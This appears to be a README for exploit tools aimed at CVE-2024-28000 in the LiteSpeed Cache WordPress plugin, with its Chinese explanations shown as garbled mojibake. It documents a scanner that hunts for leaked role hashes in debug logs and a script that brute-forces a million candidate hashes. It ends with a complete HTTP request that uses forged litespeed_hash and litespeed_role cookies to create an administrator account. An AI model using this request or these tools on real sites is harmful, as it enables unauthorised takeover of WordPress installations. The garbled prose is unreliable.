# LiteSpeed Cache Privilege Escalation Exp

## CVE-2024-28000_Scan.py
- è¯¥è„šæœ¬é¦–å…ˆä¼šè¯†åˆ«ç‰ˆæœ¬ï¼Œåˆ¤æ–­æ˜¯å¦ä¸ºæ˜“æŸç‰ˆæœ¬ï¼Œåå°è¯•ç¡®è®¤logæ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œè‹¥å­˜åœ¨ï¼Œåˆ™ä¼šå°è¯•å‘åŒ…åå†æ¬¡è¯·æ±‚logæ–‡ä»¶å°è¯•æŸ¥æ‰¾hashæ³„éœ²ï¼Œè‹¥LiteSpeedå¯ç”¨debugï¼Œåˆ™æœ‰å¯èƒ½æ³„éœ²æ­£ç¡®Hash
```
usage: CVE-2024-28000_Scan.py [-h] [-f F] [-t T] [-p PROXY]

CVE-2024-28000 Scan

optional arguments:
  -h, --help            show this help message and exit
  -f F                  File list
  -t T                  Scan thread
  -p PROXY, --proxy PROXY
                        Example: socks5://127.0.0.1:10808
```
ç¤ºä¾‹:
```
09/08/24 16:30:38.219 [0.0.0.0:26008 1 TG9] ğŸ’“ ------POST HTTP/1.1 (HTTPS)  /wp-json/wp/v2/users
09/08/24 16:30:38.219 [0.0.0.0:26008 1 TG9] Query String: 
09/08/24 16:30:38.231 [0.0.0.0:26008 1 TG9] [Router] starting role validation
09/08/24 16:30:38.232 [0.0.0.0:26008 1 TG9] [Router] hash not match zasws5 != pkHrfD
09/08/24 16:30:38.232 [0.0.0.0:26008 1 TG9] [Router] get_role: 
09/08/24 16:30:38.241 [0.0.0.0:26008 1 TG9] [Optm] init
```
è‹¥LiteSpeedå¯ç”¨debugï¼Œåˆ™å¯èƒ½çœ‹åˆ°ç±»ä¼¼çš„ä¸Šé¢çš„æ—¥å¿—ï¼Œå…¶ä¸­pkHrfDåˆ™ä¸ºæ­£ç¡®Hash
## CVE-2024-28000_Exploit.py
- ç»æµ‹è¯• Pythonå’ŒPHPç”Ÿæˆçš„Hashæ˜¯æœ‰å·®å¼‚çš„ï¼Œæ•…Hashåˆ—è¡¨å¹¶ä¸èƒ½ç”¨Pythonæ¨¡æ‹Ÿç”Ÿæˆï¼ŒHash_list.txtæ–‡ä»¶ä¸ºphpç”Ÿæˆçš„1000000ä¸ªHashï¼Œæ‰€ä»¥ç†è®ºä¸Šéå†æœ€é«˜1000000æ¬¡åˆ™å¯ä»¥éå†åˆ°æ­£ç¡®Hash
```
usage: CVE-2024-28000_Exploit.py [-h] [-u U] [-t T] [-d D] [-p PROXY]

CVE-2024-28000

optional arguments:
  -h, --help            show this help message and exit
  -u U                  url
  -t T                  Scan thread
  -d D                  Dict list
  -p PROXY, --proxy PROXY
                        Example: socks5://127.0.0.1:10808
```
- -då‚æ•°åˆ™ä¸ºHashåˆ—è¡¨ -uä¸ºurl -tä¸ºçº¿ç¨‹æ•°ï¼Œçº¿ç¨‹ä¸å»ºè®®è¿‡é«˜

## æµ‹è¯•
- åœ¨é¶åœºæµ‹è¯•æ˜¯å¯ä»¥æˆåŠŸéå†å‡ºHashï¼Œå¹¶ä¸”é‡è£…äº”ééƒ½å·²ç»ç¡®è®¤Hashæ˜¯åœ¨ç”Ÿæˆçš„Hashåˆ—è¡¨ä¸­çš„ï¼Œä½†æ˜¯å¤šç§æ–¹é¢è¡¨é¢å®æˆ˜åˆ©ç”¨æˆåŠŸç‡è¾ƒä½
- åœ¨æˆåŠŸæ‰¾åˆ°æ­£ç¡®Hashåå¯ç”¨ä¸‹é¢çš„æ•°æ®åŒ…æ·»åŠ adminç”¨æˆ·

```
POST /wp-json/wp/v2/users HTTP/2
Host: xxx.com
User-Agent: python-requests/2.28.1
Accept-Encoding: gzip, deflate, br
Accept: */*
Cookie: litespeed_hash=æ­£ç¡®Hash; litespeed_role=1
Content-Length: 122
Content-Type: application/json

{"username": "username", "password": "password", "email": "xadminx@example.com", "roles": ["administrator"]}
```
